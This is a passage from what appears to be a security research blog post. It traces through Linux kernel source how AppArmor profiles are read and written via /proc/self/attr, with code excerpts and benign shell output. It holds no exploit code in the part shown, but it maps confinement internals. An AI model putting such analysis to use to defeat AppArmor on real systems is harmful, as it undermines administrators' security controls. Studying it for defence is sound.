            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hard_coded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* [...] */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;hard_coded:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_apply_modes_to_perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;How can we determine which profile the current process is using? Intuitively, it should be recorded somewhere under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/&lt;/code&gt;. By analyzing the source code and using tools like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; to search for relevant keywords in both file contents and filenames, we eventually locate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This directory stores process-related attribute definitions, and within it, thereâ€™s a subdirectory named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor&lt;/code&gt;, which contains AppArmor-specific information.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /proc/self/attr
total 0
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x 9 aaa aaa 0 Feb 17 12:16 ..
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 apparmor
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 current
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 fscreate
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 keycreate
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 prev
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 smack
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 sockcreate
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current&lt;/code&gt; within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/apparmor&lt;/code&gt; shows the profile currently in use. While it has write permissions, it appears to require a &lt;strong&gt;specific format&lt;/strong&gt; for modifications to take effect.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/self/attr/current
unconfined

aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;AAA &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/self/attr/current
&lt;span class=&quot;nt&quot;&gt;-bash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;: write error: Invalid argument
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By mapping these pseudo-file names back to the source code, we can determine the read/write handlers from the file operations.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define ATTR(LSMID, NAME, MODE)             \
    NOD(NAME, (S_IFREG|(MODE)),             \
        NULL, &amp;amp;proc_pid_attr_operations,    \
        { .lsmid = LSMID })
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smack_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_SMACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;fscreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;keycreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sockcreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;smack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apparmor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file ops &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_operations&lt;/code&gt; defines the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_write()&lt;/code&gt; [6] as the write handler. At a lower level, this function calls AppArmorâ€™s setprocattr hook, which corresponds to the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; [7].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_operations&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_operations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [6]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROC_I&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hlist_for_each_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;security_hook_heads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [7]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; first converts the target filename into an enum value [8], then calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; to handle the operation [9].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [8]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [9]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

